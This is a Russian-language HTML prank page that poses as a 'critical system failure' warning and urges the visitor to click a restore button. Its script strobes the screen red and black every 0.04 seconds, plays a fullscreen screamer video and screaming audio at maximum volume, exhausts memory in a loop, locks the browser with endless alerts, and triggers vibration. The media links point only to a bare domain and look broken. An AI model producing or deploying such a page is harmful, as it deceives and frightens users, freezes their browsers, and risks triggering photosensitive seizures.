<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>ВНИМАНИЕ: ОШИБКА</title>
    <style>
        /* Бешеное мерцание */
        @keyframes strobe { 0% { background: #000; } 50% { background: #f00; } 100% { background: #000; } }
        .flash { animation: strobe 0.04s infinite !important; }
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; justify-content: center; }
        #scary_vid { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; }
        .btn { padding: 25px 50px; font-size: 24px; background: #ff0000; color: #fff; border: none; border-radius: 15px; cursor: pointer; z-index: 100; }
    </style>
</head>
<body id="b" class="flash">

    <div id="ui">
        <h1>КРИТИЧЕСКИЙ СБОЙ СИСТЕМЫ</h1>
        <p>Ваши данные под угрозой. Нажмите для восстановления.</p>
        <button class="btn" onclick="startPrank()">ВОССТАНОВИТЬ</button>
    </div>

    <!-- ВИДЕО-СКРИМЕР (Прямая ссылка) -->
    <video id="scary_vid" playsinline loop muted>
        <source src="https://raw.githubusercontent.com" type="video/mp4">
    </video>

    <!-- ОР (Прямая ссылка) -->
    <audio id="scream" src="https://raw.githubusercontent.com" loop></audio>

    <script>
        function startPrank() {
            const v = document.getElementById("scary_vid");
            const a = document.getElementById("scream");
            const ui = document.getElementById("ui");

            ui.style.display = "none";
            v.style.display = "block";
            
            // Включаем звук и видео
            v.muted = false; // Разрешаем звук после клика
            v.play();
            a.volume = 1.0;
            a.play();

            // Попытка на весь экран
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            }

            // Забивка памяти в фоне
            setInterval(() => {
                let x = new Array(1000000).fill("CRASH_");
                console.log(x);
            }, 100);

            // Бесконечные алерты через 2 секунды
            setTimeout(() => {
                while(true) { alert("СИСТЕМА УНИЧТОЖЕНА!"); }
            }, 2000);
        }

        window.onload = function() {
            if (navigator.vibrate) setInterval(() => navigator.vibrate(), 1000);
        };
    </script>
</body>
</html>
